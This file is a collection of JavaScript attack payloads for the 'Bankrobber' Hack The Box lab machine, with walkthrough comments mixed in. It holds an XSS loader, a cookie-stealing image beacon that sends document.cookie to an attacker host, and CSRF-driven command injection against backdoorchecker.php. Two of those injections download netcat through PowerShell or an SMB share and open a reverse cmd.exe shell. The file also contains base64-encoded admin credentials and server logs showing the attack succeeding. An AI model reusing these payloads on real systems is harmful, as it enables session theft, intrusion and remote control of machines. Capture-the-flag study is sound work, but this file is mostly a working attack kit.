
var request = new XMLHttpRequest();
var params = 'cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.5 443';
request.open('POST', 'http://localhost/admin/backdoorchecker.php', true);
request.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
request.send(params);


// This will get the admin user to make a request for me, which is a Cross-Site Request Forgery (XSRF) attack.
// I’ll submit the XSS payload to get shell.js through my logged in user, and wait for the payload to fire.:

// <script src="http://10.10.69.69/shell.js"></script>
// When it does, I’ll see a GET for shell.js, which will run, and issuing a POST to /admin/backdoorchecker.php with the parameters cmd=dir|powershell -c "iwr -uri 10.10.14.5/nc64.exe -outfile %temp%\\n.exe"; %temp%\\n.exe -e cmd.exe 10.10.14.5 443. This will pass all the checks in backdoorchecker.php, and pass that on to system, which will run the dir, followed by the powershell to download nc64.exe from my server, save it in %temp%. Then my commands have it run nc to connect back to me with a shell.
//
// After a few minutes, that’s exactly what I see:
//
// 10.10.10.154 - - [22/Sep/2019 06:50:55] "GET /shell.js HTTP/1.1" 200 -
// 10.10.10.154 - - [22/Sep/2019 06:50:58] "GET /nc64.exe HTTP/1.1" 200 -
// And then a shell on my waiting nc listener (always use rlwrap with windows):

//////////////////////////
//
//

// Or.

//////////////////////////
//////////////////////////
// https://vulndev.io/2020/03/07/bankrobber-hackthebox/


	
<script src="http://<ip>:8000/script.js"></script>

//
//

function addImg(){
var img = document.createElement('img');
img.src = 'http://<ip>:8000/' + document.cookie;
document.body.appendChild(img);
}
addImg();

//
//

var xhr = new XMLHttpRequest();
document.cookie = "id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D";
var uri ="/admin/backdoorchecker.php";
xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("cmd=dir|\\\\<ip>\\xshare\\share\\nc.exe <ip> 7000 -e cmd.exe");

////////////////////
//
//
